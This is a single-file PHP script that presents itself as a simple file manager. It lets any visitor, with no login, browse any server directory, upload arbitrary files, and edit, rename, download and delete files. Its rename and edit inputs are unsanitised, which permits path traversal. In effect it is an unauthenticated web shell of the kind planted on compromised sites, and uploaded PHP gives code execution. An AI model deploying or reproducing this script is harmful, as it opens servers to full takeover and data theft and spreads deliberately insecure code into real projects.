<?php
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);

// Upload file
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . basename($_FILES['file']['name']));
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Buat folder
if (isset($_POST['new_folder'])) {
    mkdir($path . '/' . basename($_POST['new_folder']));
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Hapus file/folder
if (isset($_GET['delete'])) {
    $target = $path . '/' . basename($_GET['delete']);
    if (is_dir($target)) rmdir($target);
    else unlink($target);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Rename file/folder
if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    rename($path . '/' . $_POST['rename_old'], $path . '/' . $_POST['rename_new']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Edit file (simpan)
if (isset($_POST['edit_file']) && isset($_POST['content'])) {
    file_put_contents($path . '/' . $_POST['edit_file'], $_POST['content']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// Edit file (form)
if (isset($_GET['edit'])) {
    $file = $path . '/' . basename($_GET['edit']);
    echo "<h2>Editing: " . htmlspecialchars($_GET['edit']) . "</h2>";
    echo '<form method="post">';
    echo '<input type="hidden" name="edit_file" value="'.htmlspecialchars($_GET['edit']).'">';
    echo '<textarea name="content" rows="20" cols="100">'.htmlspecialchars(file_get_contents($file)).'</textarea><br>';
    echo '<button type="submit">Save</button>';
    echo '</form><br><a href="?path='.urlencode($path).'">Back</a>';
    exit;
}

echo "<h2>PHP File Manager</h2>";
echo "<p>Current Path: $path</p>";
echo '<form enctype="multipart/form-data" method="post">
    <input type="file" name="file">
    <button type="submit">Upload</button>
</form>';

echo '<form method="post">
    <input type="text" name="new_folder" placeholder="New folder name">
    <button type="submit">Create Folder</button>
</form>';

$files = scandir($path);
echo "<table border=1 cellpadding=5><tr><th>Name</th><th>Type</th><th>Action</th></tr>";

foreach ($files as $file) {
    if ($file == ".") continue;
    $fullpath = $path . '/' . $file;
    $is_dir = is_dir($fullpath);
    echo "<tr>";
    echo "<td>".htmlspecialchars($file)."</td>";
    echo "<td>".($is_dir ? "Folder" : "File")."</td>";
    echo "<td>";
    if ($is_dir) {
        echo "<a href='?path=".urlencode($fullpath)."'>Open</a> ";
    } else {
        echo "<a href='".htmlspecialchars(basename($_SERVER['PHP_SELF']))."?path=".urlencode($path)."&edit=".urlencode($file)."'>Edit</a> ";
        echo "<a href='$fullpath' download>Download</a> ";
    }
    echo "<a href='?path=".urlencode($path)."&delete=".urlencode($file)."' onclick='return confirm(\"Delete $file?\");'>Delete</a>";
    echo "</td></tr>";
}

echo "</table><br>";

echo '<form method="post">
    <input type="text" name="rename_old" placeholder="Old name">
    <input type="text" name="rename_new" placeholder="New name">
    <button type="submit">Rename</button>
</form>';
?>
